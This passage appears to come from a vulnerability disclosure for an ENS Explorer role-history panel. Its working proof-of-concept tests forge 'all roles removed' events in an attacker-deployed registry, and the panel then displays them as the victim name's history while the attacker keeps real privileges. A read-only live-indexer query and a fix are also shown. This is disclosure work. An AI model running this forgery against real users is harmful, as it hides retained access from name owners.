}, 240_000)

describe("the Explorer's role-history panel", () => {
  it('0. the shipped query filters EACRolesChanged by type only — no contractAddress — while the sibling hook filters by contractAddress and says why', () => {
    // the two GraphQL `where` clauses, verbatim from the shipped files
    expect(HOOK_SRC).toContain(`              where: {
                type: "EACRolesChanged"
                blockNumber_lt: $blockNumberLt
              }`)
    expect(HOOK_SRC).not.toContain('contractAddress')
    expect(SIBLING_SRC).toContain(`          where: {
            type: "EACRolesChanged"
            contractAddress: $contractAddress
          }`)
    expect(SIBLING_SRC).toContain("isn't scoped by registry")   // the hazard, in its own words
    // the only narrowing useRoleHistory applies
    expect(HOOK_SRC).toContain(
      "const resource = label ? toResourceHex(labelToCanonicalId(label)) : undefined",
    )
    expect(HOOK_SRC).toContain('filterEventsByResource(allEvents, resource)')
  })

  it('1. a name is identified by labelToCanonicalId(label) alone, so the same label in ANY registry produces the same resource id', async () => {
    const fromLabel = toResourceHex(labelToCanonicalId(VICTIM_LABEL))
    console.log(`\n  labelToCanonicalId("${VICTIM_LABEL}") = ${fromLabel}`)
    console.log(`  ETHRegistry.getResource(labelhash)   = ${toResourceHex(victimResource)}`)
    expect(fromLabel).toBe(toResourceHex(victimResource))
    // nothing in the expression depends on the registry, the parent, or the namehash
    expect(fromLabel).toBe(
      toResourceHex(BigInt(labelhash(VICTIM_LABEL)) ^ (BigInt(labelhash(VICTIM_LABEL)) & 0xffffffffn)),
    )
  }, 120_000)

  it("2. the attacker builds her forgery with the Explorer's own transaction builders, and the resource she writes to is byte-identical to the victim's", async () => {
    // --- (a) "Configure registry" -> Deploy a new Permissioned Registry ------
    const deployed = await submit(malloryWallet, prepareDeploySubregistryTransaction({
      factoryAddress: VERIFIABLE_FACTORY, implAddress: USER_REGISTRY_IMPL,
      walletClient: malloryWallet, chainId: sepolia.id,
    }))
    expect(deployed.status).toBe('success')
    const deployReceipt = await publicClient.getTransactionReceipt({ hash: deployed.hash })
    // the app's own ProxyDeployed decoder
    attackerRegistry = parseProxyDeployedAddress(deployReceipt.logs as never) as Address
    expect(attackerRegistry).toBeTruthy()
    console.log(`\n  attacker's subregistry (deployed by the app's builder) = ${attackerRegistry}`)

    // --- (b) "Set subregistry" on her own name ------------------------------
    // [… 10 lines elided: the same submit(...) / toMatchObject({ status:
    //    'success' }) pair around prepareSetSubregistryTransaction({ label:
    //    ATTACKER_LABEL, parentRegistry: ETH_REGISTRY, subregistryAddress:
    //    attackerRegistry, … }) …]

    // --- (c) "Create subname" with the VICTIM'S label -----------------------
    expect(
      await submit(malloryWallet, prepareCreateSubnameTransaction({
        registryAddress: attackerRegistry,
        label: VICTIM_LABEL,  // p91306treasury.p91306mal.eth
        owner: BURNER,        // a throwaway, so every row for MALLORY below is forged
        resolverAddress: '0x0000000000000000000000000000000000000000',
        walletClient: malloryWallet, chainId: sepolia.id,
        expires: BigInt(Math.floor(Date.now() / 1000)) + 31_536_000n,
      })),
    ).toMatchObject({ status: 'success' })

    const attackerResource = await publicClient.readContract({
      address: attackerRegistry, abi: registryReadAbi, functionName: 'getResource',
      args: [BigInt(labelhash(VICTIM_LABEL))],
    })
    console.log(`  resource of ${VICTIM_NAME} on the real ETHRegistry      = ${toResourceHex(victimResource)}`)
    console.log(`  resource of ${VICTIM_LABEL}.${ATTACKER_LABEL}.eth in her registry = ${toResourceHex(attackerResource)}`)
    expect(toResourceHex(attackerResource)).toBe(toResourceHex(victimResource))
  }, 300_000)

  it('3. the forged "all roles removed" entry is emitted, and the app\'s own filter renders it as the VICTIM name\'s history', async () => {
    // Mallory still genuinely holds ROLE_SET_RESOLVER on the victim's name.
    const stillPrivileged = await publicClient.readContract({
      address: ETH_REGISTRY, abi: registryReadAbi, functionName: 'hasRoles',
      args: [victimResource, 1n << 24n, MALLORY.address],
    })
    console.log(`\n  Mallory hasRoles(ROLE_SET_RESOLVER) on ${VICTIM_NAME} = ${stillPrivileged}`)
    expect(stillPrivileged).toBe(true)

    // --- the forgery: grant then revoke, on HER registry, for HER address ---
    // Both built by the Explorer's own roles helpers, with `name` = the label
    // she created in her own registry.
    const common = {
      name: `${VICTIM_LABEL}.${ATTACKER_LABEL}.eth`,
      account: MALLORY.address,
      roles: ['ROLE_SET_RESOLVER', 'ROLE_SET_SUBREGISTRY', 'ROLE_RENEW'],
      walletClient: malloryWallet, chainId: sepolia.id,
      registryAddress: attackerRegistry,
    }
    const grant = await submit(malloryWallet, prepareGrantRolesTransaction(common))
    expect(grant.status).toBe('success')
    const revoke = await submit(malloryWallet, prepareRevokeRolesTransaction(common))
    expect(revoke.status).toBe('success')
    console.log(`  forged revoke tx (on the attacker's registry) = ${revoke.hash}`)

    // --- what the indexer would serve `useRoleHistory` ----------------------
    // No contractAddress filter, so BOTH registries' rows are in the page.
    const rows = [
      ...(await indexerRowsFor(ETH_REGISTRY)),
      ...(await indexerRowsFor(attackerRegistry)),
    ]
    // useRoleHistory.ts:84-86, verbatim
    const history = filterEventsByResource(rows, toResourceHex(labelToCanonicalId(VICTIM_LABEL)))
    // RoleHistoryTable.tsx:157-163 — the sidebar filters to the selected account
    const forMallory = history.filter(
      (e) => e.account.toLowerCase() === MALLORY.address.toLowerCase(),
    )
    console.log(`\n  --- what /${VICTIM_NAME}/roles shows for ${MALLORY.address} ---`)
    // [… 12 lines elided: the loop printing each row as
    //    "block N  x roles -> y roles  +ADDED -REMOVED   tx 0x…" …]

    // The newest row for Mallory is the attacker's forged revocation, not the
    // victim's real grant — `filterEventsByResource` sorts blockNumber desc.
    const newest = forMallory[0]
    expect(newest.transactionHash).toBe(revoke.hash)
    expect(newest.newRoles).toEqual([])
    expect(newest.oldRoles.length).toBeGreaterThan(0)

    // and the victim's REAL grant is buried underneath it
    const real = forMallory.find((e) => e.newRoles.includes('ROLE_SET_RESOLVER'))
    expect(real).toBeDefined()
    expect(forMallory.indexOf(real!)).toBeGreaterThan(0)

    // every forged row survived the filter
    const forgedHashes = new Set([grant.hash, revoke.hash])
    const survivors = history.filter((e) => forgedHashes.has(e.transactionHash))
    console.log(`\n  forged events emitted by the attacker's registry that the panel accepted: ${survivors.length}/2`)
    expect(survivors).toHaveLength(2)

    // ...while Mallory's authority over the victim's name is untouched.
    const stillAfter = await publicClient.readContract({
      address: ETH_REGISTRY, abi: registryReadAbi, functionName: 'hasRoles',
      args: [victimResource, 1n << 24n, MALLORY.address],
    })
    console.log(`  after the "revocation" the panel shows, Mallory still hasRoles(ROLE_SET_RESOLVER) on ${VICTIM_NAME} = ${stillAfter}\n`)
    expect(stillAfter).toBe(true)
  }, 300_000)
})
```

### Output — against the unmodified shipped source

```
$ cd apps/portal && npx vitest run --reporter=verbose \
    .poc91306/role-history-cross-registry.poc.test.ts

 RUN  v4.1.5 /Users/bp/x/ens/3/apps/portal

stdout | 1. a name is identified by labelToCanonicalId(label) alone …

  labelToCanonicalId("p91306treasury") = 0x5becd483ebec304f85707bb84d380fc5cac2981465b9c3bec00a845300000000
  ETHRegistry.getResource(labelhash)   = 0x5becd483ebec304f85707bb84d380fc5cac2981465b9c3bec00a845300000000

[… 5 lines elided: the ✓ lines for tests 0 and 1, both passing …]

stdout | 2. the attacker builds her forgery with the Explorer's own transaction builders …

  attacker's subregistry (deployed by the app's builder) = 0x0771F9cD04F66d285Da14196509A88C54b8e3026
  resource of p91306treasury.eth on the real ETHRegistry      = 0x5becd483ebec304f85707bb84d380fc5cac2981465b9c3bec00a845300000000
  resource of p91306treasury.p91306mal.eth in her registry = 0x5becd483ebec304f85707bb84d380fc5cac2981465b9c3bec00a845300000000

 ✓ 2. the attacker builds her forgery with the Explorer's own transaction builders, and
      the resource she writes to is byte-identical to the victim's            310ms

stdout | 3. the forged "all roles removed" entry is emitted …

  Mallory hasRoles(ROLE_SET_RESOLVER) on p91306treasury.eth = true
  forged revoke tx (on the attacker's registry) = 0x6f4df0e13c6de013c4937c45670f0fca5ddf073e87aedca10c9b82194dfbd2dd

  --- what /p91306treasury.eth/roles shows for 0x5CbDd86a2FA8Dc4bDdd8a8f69dBa48572EeC07FB ---
    block 11669653  3 roles -> 0 roles  -ROLE_RENEW -ROLE_SET_RESOLVER -ROLE_SET_SUBREGISTRY   tx 0x6f4df0e13c…
    block 11669652  0 roles -> 3 roles  +ROLE_RENEW +ROLE_SET_RESOLVER +ROLE_SET_SUBREGISTRY   tx 0x7aab003ce0…
    block 11669633  0 roles -> 1 roles  +ROLE_SET_RESOLVER   tx 0x17ec4bd769…

  forged events emitted by the attacker's registry that the panel accepted: 2/2
  after the "revocation" the panel shows, Mallory still hasRoles(ROLE_SET_RESOLVER) on p91306treasury.eth = true

 ✓ 3. the forged "all roles removed" entry is emitted, and the app's own filter renders
      it as the VICTIM name's history                                        2085ms

 Test Files  1 passed (1)
      Tests  4 passed (4)
   Duration  3.14s
```

The first two rows of that history table were produced by transactions sent to `0x0771F9cD04F66d285Da14196509A88C54b8e3026` — Mallory's own registry, deployed thirty seconds earlier, with no relationship whatsoever to `p91306treasury.eth`. Only the third row, `+ROLE_SET_RESOLVER` at block 11669633, is a real event on Alice's name. The newest row, saying the account was stripped of everything, is a lie Alice has no way to detect from this screen.

### Second test — the shipped query against the LIVE indexer

The fork test leaves one step to the reader: that a query with no `contractAddress` filter really does return rows from more than one registry. That no longer needs to be taken on trust. `packages/indexer/urql/client.ts:28,36` returns `'https://staging-graphql.ens.dev/'` when no `VITE_` override is present, so it is the endpoint the shipped app talks to by default, and it is live.

This test sends the **shipped `getRoleHistory` document byte-for-byte**, with the app's own paging (`first: 1000`, `blockNumber_lt` walked backwards; `useRoleHistory.ts:24,27` caps at 50 pages, ten are enough), then applies the app's own narrowing. It only *adds* `contractAddress` and `name` to the selection set so rows can be attributed afterwards — the `where` clause is untouched. It is read-only: no transaction, no writes. Save as `apps/portal/.poc91306/live-indexer.test.ts`:

```ts
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { describe, expect, it } from 'vitest'
import { filterEventsByResource, type IndexerEACEvent } from '@/lib/roles/filterEventsByResource'
import { toResourceHex } from '@/lib/roles/toResourceHex'

const URL = 'https://staging-graphql.ens.dev/'
// the SHIPPED query from useRoleHistory.ts:50-68, byte-for-byte
const Q = `query getRoleHistory($blockNumberLt: Int!, $first: Int!) {
  events(where: { type: "EACRolesChanged" blockNumber_lt: $blockNumberLt } first: $first orderBy: blockNumber orderDirection: desc) {
    type data transactionHash timestamp blockNumber contractAddress name
  }
}`

type Row = IndexerEACEvent & { contractAddress: string; name?: string | null }

describe('live indexer', () => {
  it('serves EACRolesChanged rows from many registries, and the app filter accepts rows from more than one registry for one label', async () => {
    const rows: Row[] = []
    let blockNumberLt = Number.MAX_SAFE_INTEGER
    for (let p = 0; p < 10; p++) {
      const r = await fetch(URL, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ query: Q, variables: { blockNumberLt, first: 1000 } }),
      })
      const j = (await r.json()) as { data: { events: Row[] } }
      const evs = j.data.events
      if (evs.length === 0) break
      rows.push(...evs)
      if (evs.length < 1000) break
      blockNumberLt = evs[evs.length - 1].blockNumber
    }
    const contracts = new Set(rows.map((e) => e.contractAddress))
    console.log(`\n  rows pulled by the SHIPPED query: ${rows.length}`)
    console.log(`  distinct registry contracts in that page set: ${contracts.size}`)

    // the app's own narrowing, useRoleHistory.ts:84-86
    const resource = toResourceHex(labelToCanonicalId('research'))
    const history = filterEventsByResource(rows, resource)
    const byTx = new Map(rows.map((e) => [e.transactionHash, e]))
    const regs = new Map<string, Set<string>>()
    for (const h of history) {
      const src = byTx.get(h.transactionHash)!
      if (!regs.has(src.contractAddress)) regs.set(src.contractAddress, new Set())
      regs.get(src.contractAddress)!.add(String(src.name))
    }
    console.log(`\n  labelToCanonicalId('research') = ${resource}`)
    console.log(`  rows the panel would render as "research.<x>.eth" history:`)
    for (const [c, names] of regs) console.log(`    registry ${c}  names: ${[...names].join(', ')}`)
    expect(contracts.size).toBeGreaterThan(1)
    expect(regs.size).toBeGreaterThan(1)
  }, 300_000)
})
```

Output:

```
$ cd apps/portal && npx vitest run --reporter=verbose .poc91306/live-indexer.test.ts

 RUN  v4.1.5 /Users/bp/x/ens/3/apps/portal

stdout | .poc91306/live-indexer.test.ts > live indexer > serves EACRolesChanged rows from many
registries, and the app filter accepts rows from more than one registry for one label

  rows pulled by the SHIPPED query: 10000
  distinct registry contracts in that page set: 1305

  labelToCanonicalId('research') = 0x95f7801c97b17401c2c5a5b8fdb4f956cc377f647e35794f5b5da6ae00000000
  rows the panel would render as "research.<x>.eth" history:
    registry 0x4d2b9db6b011425f12f271fa680b0ec8c2f0cd0e  names: research.capsulefleet.eth
    registry 0xd0d823c89c68e7a80e4bd5215999965065b4255d  names: research.nymspace.eth

 ✓ live indexer > serves EACRolesChanged rows from many registries, and the app filter
   accepts rows from more than one registry for one label                        19274ms

 Test Files  1 passed (1)
      Tests  1 passed (1)
   Duration  19.48s
```

Three things this settles, none of them previously executed. **The indexer does serve every registry's rows for this query** — 10,000 rows, **1,305 distinct `contractAddress` values**. **It does index arbitrary user-deployed registries**, not only the canonical `.eth` registry, so Mallory's freshly deployed proxy is indexed like the other 1,300-odd. And **the collision is already live with no attacker at all**: `research.capsulefleet.eth` and `research.nymspace.eth`, different owners in different registries, share resource `0x95f7801c…00000000` today, and the shipped `filterEventsByResource` accepts both as one name's history.

There is also no "the panel never worked anyway" escape. The endpoint accepts the app's own initial cursor, `blockNumberLt: 9007199254740991` (`Number.MAX_SAFE_INTEGER`) against `$blockNumberLt: Int!` — that is the first page of the run above — and it honours `contractAddress` when supplied, so the one-line fix is not merely schema-legal but working today:

```
$ curl -s -X POST https://staging-graphql.ens.dev/ -H 'content-type: application/json' \
  -d '{"query":"query($c:String!,$b:Int!,$f:Int!){events(where:{type:\"EACRolesChanged\" contractAddress:$c blockNumber_lt:$b} first:$f orderBy:blockNumber orderDirection:desc){contractAddress blockNumber}}","variables":{"c":"0x4d2b9db6b011425f12f271fa680b0ec8c2f0cd0e","b":9007199254740991,"f":5}}'

{"data":{"events":[
  {"contractAddress":"0x4d2b9db6b011425f12f271fa680b0ec8c2f0cd0e","blockNumber":11669322},
  {"contractAddress":"0x4d2b9db6b011425f12f271fa680b0ec8c2f0cd0e","blockNumber":11668303},
  {"contractAddress":"0x4d2b9db6b011425f12f271fa680b0ec8c2f0cd0e","blockNumber":11660144},
  {"contractAddress":"0x4d2b9db6b011425f12f271fa680b0ec8c2f0cd0e","blockNumber":11660144},
  {"contractAddress":"0x4d2b9db6b011425f12f271fa680b0ec8c2f0cd0e","blockNumber":11660144}]}}
```

The shipped query works — it just answers a global question.
